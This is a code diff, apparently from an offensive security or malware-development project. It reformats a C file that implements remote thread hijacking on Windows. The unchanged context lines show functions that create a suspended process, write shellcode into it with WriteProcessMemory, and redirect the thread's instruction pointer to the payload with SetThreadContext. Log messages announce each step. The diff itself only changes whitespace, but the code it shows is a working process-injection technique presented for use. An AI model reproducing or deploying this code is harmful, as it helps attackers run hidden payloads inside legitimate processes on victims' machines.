@@ -26,11 +26,11 @@ BOOL CreateSuspendedProcess(
 	_Out_ PHANDLE ThreadHandle
 ) {
 
-	BOOL   State = TRUE;
-	CHAR   Path[MAX_PATH * 2];
+	BOOL State = TRUE;
+	CHAR Path[MAX_PATH * 2];
 	CHAR WindowsDir[MAX_PATH];
-	STARTUPINFO            SI;
-	PROCESS_INFORMATION    PI;
+	STARTUPINFO SI;
+	PROCESS_INFORMATION PI;
 
 	RtlSecureZeroMemory(&SI, sizeof(SI));
 	RtlSecureZeroMemory(&PI, sizeof(PI));
@@ -71,8 +71,8 @@ BOOL RemoteThreadHijack(
 ) {
 
 	DWORD   OldProtection = 0;
-	BOOL    State = TRUE;
-	CONTEXT CTX = { .ContextFlags = CONTEXT_ALL };
+	BOOL    State         = TRUE;
+	CONTEXT CTX           = { .ContextFlags = CONTEXT_ALL };
 
 	WriteProcessMemory(ProcessHandle, Buffer, Shellcode, ShellcodeSize, 0);
 	OKAY("[0x%p] [RW-] copied payload contents (%zu-bytes) to the allocated buffer", Buffer, ShellcodeSize);
@@ -101,7 +101,6 @@ BOOL RemoteThreadHijack(
 		(PVOID*)CTX.Rip, (PVOID*)CTX.Rax, (PVOID*)CTX.Rbx,
 		(PVOID*)CTX.Rcx, (PVOID*)CTX.Rdx, (PVOID*)CTX.Rsp, (PVOID*)CTX.Rbp
 	);
-
 	INFO("| RIP -> [0x%p] updating the thread's context to make RIP point to our allocated buffer...", (PVOID*)CTX.Rip);
 
 	CTX.Rip = (DWORD64)Buffer;
@@ -110,7 +109,6 @@ BOOL RemoteThreadHijack(
 		PRINT_ERROR("SetThreadContext");
 		State = FALSE; goto CLEANUP;
 	}
-
 	OKAY("| RIP -> [0x%p] set the thread's context! RIP now points to our payload buffer!", (PVOID*)CTX.Rip);
 
 	printf(
